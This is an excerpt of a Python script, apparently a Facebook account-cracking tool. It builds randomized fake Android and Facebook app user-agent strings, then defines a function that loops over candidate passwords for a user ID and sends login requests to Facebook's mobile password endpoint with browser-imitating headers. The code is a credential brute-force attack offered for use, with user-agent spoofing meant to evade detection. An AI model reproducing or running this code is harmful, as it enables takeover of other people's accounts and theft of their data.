...
def ugen():
	rr = random.randint
	rc = random.choice
	aa = f"Mozilla/5.0 (Linux; Android 10; Star) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(10,113))}.0.{str(rr(1111,5999))}.{str(rr(45,150))} Mobile Safari/537.36"
	bb = f"Dalvik/2.1.0 (Linux; U; Android 10; Star Build/QP1A.190711.020) [FBAN/EMA;FBBV/{str(rr(510000000,599999999))};FBAV/{str(rr(410,450))}.0.0.{str(rr(1,9))}.{str(rr(50,110))};FBDV/Star;FBLC/id_ID;FBNG/WIFI;FBMNT/METERED;FBDM/"+"{density=1.875}]"
	cc = f"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) SFive/{str(rr(10,113))}.0 Chrome/{str(rr(10,113))}.0.{str(rr(1111,5999))}.{str(rr(45,150))} Safari/537.36"
	return rc([aa,bb])
...
def generateuseragentdalvik():
	...
	model = random.choice(["ASUS_Z01QD Build/QKQ1.190825.002"])
	...
	return (f"Dalvik/2.1.0 (Linux; U; Android {versi}) {model}) [FBAN/MessengerLite;FBAV/{versi_apk};FBPN/com.facebook.mlite;FBLC/in_ID;FBBV/{versi_app};FBCR/INDOSAT;FBMF/asus;FBBD/asus;FBDV/ASUS_Z01QD;FBSV/{versi};FBCA/armeabi-v7a:armeabi;FBDM/"+"{density=1.5,width=1280,height=720};]")
...
def _validate_(uid,pasw):
	...
	for pw in pasw:
		try:
			...
			head = {"Host": "free.prod.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt": "1","x-requested-with": "mark.via.gp","sec-fetch-site": "none","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://free.facebook.com/","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
			link = ses.get("https://free.prod.facebook.com/login/device-based/password/?uid="+uid+"&flow=login_no_pin&next=%2Fcreatorstudio%2F%3Freference%3Dvisit_from_seo&refsrc=deprecated&_rdr",headers=head)
